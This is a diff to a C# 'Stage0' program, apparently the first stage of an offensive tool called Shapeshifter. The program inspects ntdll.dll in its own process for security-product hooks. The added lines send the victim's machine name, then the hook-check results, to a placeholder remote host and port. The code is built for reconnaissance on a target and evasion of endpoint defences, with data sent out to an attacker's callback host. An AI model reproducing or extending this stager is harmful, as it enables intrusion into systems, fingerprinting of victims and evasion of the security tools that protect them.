@@ -6,10 +6,12 @@ using System.Linq;
 using System.Collections.Generic;
 using System.Net.Sockets;
 using System.Reflection;
+using System.Text;
 
 namespace Stage0
 {
-    class Program
+
+  public class Program
     {
         public static string _host = "[SHAPESHIFTER_HOST]";
         public static string _port = "[SHAPESHIFTER_PORT]";
@@ -42,7 +44,8 @@ namespace Stage0
             0xb8              // mov eax, ??
         };
 
-        static void Main(string[] args)
+        public static void Main(string[] args)
+        //public static void exec()
         {
             // Get the base address of ntdll.dll in our own process
             IntPtr ntdllBase = GetNTDLLBase();
@@ -88,6 +91,8 @@ namespace Stage0
 
             string data = BitConverter.ToString(HookChecks);
             //data = System.Text.Encoding.ASCII.GetString(bytes, 0, i);
+            byte[] key = Encoding.UTF8.GetBytes("KEY:"+Environment.MachineName);
+            SendData(_host, Convert.ToInt32(_port), key);
             SendData(_host, Convert.ToInt32(_port), HookChecks);
         }
 
